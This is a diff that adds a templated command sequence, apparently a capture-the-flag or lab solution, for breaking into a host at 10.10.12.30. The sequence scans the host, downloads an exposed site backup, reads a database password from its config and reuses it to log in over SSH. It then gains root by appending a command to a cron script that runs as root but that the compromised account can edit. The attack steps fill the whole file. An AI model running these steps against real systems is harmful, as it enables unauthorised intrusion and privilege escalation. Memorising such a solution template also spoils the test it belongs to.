@@ -1,0 +1,19 @@
+## scan once and read the site like a visitor: robots.txt names the backup folder
+nmap -sV 10.10.12.30
+curl -s http://10.10.12.30/robots.txt
+curl -s http://10.10.12.30/backup/
+curl -s http://10.10.12.30/backup/site-backup.tar.gz -o site-backup.tar.gz
+tar xzf site-backup.tar.gz
+cat site/config/db.php
+## the database password opens ssh for the service account
+ssh -o StrictHostKeyChecking=accept-new {{SVCUSER}}@10.10.12.30
+{{DBPW}}
+cat flag.txt
+## no sudo: a root job on a timer runs a script this account may edit
+ls /etc/cron.d
+cat /etc/cron.d/{{JOB}}
+ls -l {{JOBDIR}}/{{JOB}}.sh
+echo 'cp /root/flag.txt /tmp/r.txt; chmod 644 /tmp/r.txt' >> {{JOBDIR}}/{{JOB}}.sh
+#wait 60
+cat /tmp/r.txt
+exit
